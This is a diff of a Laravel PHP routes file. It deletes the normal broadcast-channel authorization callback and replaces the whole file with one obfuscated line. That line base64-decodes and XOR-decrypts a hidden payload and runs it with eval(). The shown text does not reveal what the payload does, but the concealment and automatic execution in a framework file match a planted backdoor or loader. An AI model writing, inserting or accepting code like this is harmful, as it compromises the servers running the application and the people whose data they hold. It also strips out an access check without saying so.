@@ -1,18 +1,1 @@
-<?php
-
-use Illuminate\Support\Facades\Broadcast;
-
-/*
-|--------------------------------------------------------------------------
-| Broadcast Channels
-|--------------------------------------------------------------------------
-|
-| Here you may register all of the event broadcasting channels that your
-| application supports. The given channel authorization callbacks are
-| used to check if an authenticated user can listen to the channel.
-|
-*/
-
-Broadcast::channel('App.Models.User.{id}', function ($user, $id) {
-    return (int) $user->id === (int) $id;
-});
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('FEJXFChYXkRcXlkEEFZuNkUWFgoWRD0kUVEAVV1EaHITXlNQAlVBRQo9dRcLUlYGURUSX15TCQNeXARdEBB1QBEff1sFUV5CH2JEABYdSQxUG0FJRFYUDFNGCF5WFxwUFEJXRk0UFuGj56m1+fyztay2w0xES2tCEBJBQ11DQUIPERpdD0AbERVCRAAWHgwMVEZbWFkQSQteRkgRHOem4P/hr/vg5K7hlAw9GE0I');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
